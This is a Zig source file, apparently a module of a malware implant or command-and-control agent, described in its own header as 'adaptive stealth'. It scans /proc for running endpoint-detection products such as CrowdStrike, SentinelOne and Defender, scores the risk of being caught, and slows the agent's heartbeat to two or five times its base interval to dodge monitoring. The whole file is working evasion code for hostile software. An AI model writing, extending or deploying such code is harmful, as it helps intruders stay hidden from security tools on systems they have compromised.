//! Adaptive stealth: detects security products and adjusts behavior.
const std = @import("std");
const logger = @import("logger.zig");
const config = @import("../config/parser.zig");

const edr_names = [_][]const u8{
    "crowdstrike",
    "sentinelone",
    "cylance",
    "defender",
    "carbonblack",
};

pub fn riskScore() u8 {
    // Read /proc to check running processes
    var score: u8 = 0;
    var dir = std.fs.openDirAbsolute("/proc", .{ .iterate = true }) catch return 0;
    defer dir.close();
    var it = dir.iterate();
    while (it.next() catch null) |entry| {
        if (entry.kind != .directory) continue;
        const pid_str = entry.name;
        // Read /proc/<pid>/comm
        const comm_path = std.fmt.allocPrint(std.heap.page_allocator, "/proc/{s}/comm", .{pid_str}) catch continue;
        defer std.heap.page_allocator.free(comm_path);
        const comm = std.fs.cwd().readFileAlloc(std.heap.page_allocator, comm_path, 256) catch continue;
        defer std.heap.page_allocator.free(comm);
        for (edr_names) |name| {
            if (std.mem.indexOf(u8, comm, name) != null) {
                score += 25;
                break;
            }
        }
    }
    return if (score > 100) 100 else score;
}

pub fn getAdjustedHeartbeat(base: u32) u32 {
    const score = riskScore();
    if (score >= 50) {
        return base * 5; // slow down to 5x interval
    } else if (score >= 25) {
        return base * 2;
    }
    return base;
}
